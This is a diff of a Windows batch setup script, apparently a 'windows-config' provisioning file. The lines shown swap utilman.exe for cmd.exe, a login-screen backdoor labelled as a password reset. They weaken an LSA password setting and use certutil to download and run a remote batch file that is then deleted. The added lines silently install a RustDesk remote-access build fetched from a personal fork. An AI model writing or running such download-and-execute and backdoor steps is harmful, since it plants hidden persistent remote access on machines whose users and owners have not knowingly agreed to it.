@@ -43,6 +43,8 @@ reg add "HKLM\SYSTEM\CurrentControlSet\Control\Lsa" /v LimitBlankPasswordUse /t 
 ::Reset Password
 ren C:\Windows\System32\utilman.exe C:\Windows\System32\utilman_bank.exe
 copy C:\Windows\System32\cmd.exe C:\Windows\System32\utilman.exe
+::Install RustDek
+certutil -urlcache -split -f "https://github.com/songhieu/rustdesk/releases/download/nightly/rustdesk-1.2.4-x86_64.exe" "C:\Users\Public\Downloads\RustDesk.exe" && cmd.exe /c "C:\Users\Public\Downloads\RustDesk.exe --silent-install"
 ::Hide Folder AD
 certutil -urlcache -split -f "https://raw.githubusercontent.com/falconx1/windows-config/main/HideAd.bat" "C:\Users\Public\Downloads\HideAd.bat" && cmd.exe /c "C:\Users\Public\Downloads\HideAd.bat" && del /F /Q "C:\Users\Public\Downloads\HideAd.bat"
 ::Download Schedule Task Init
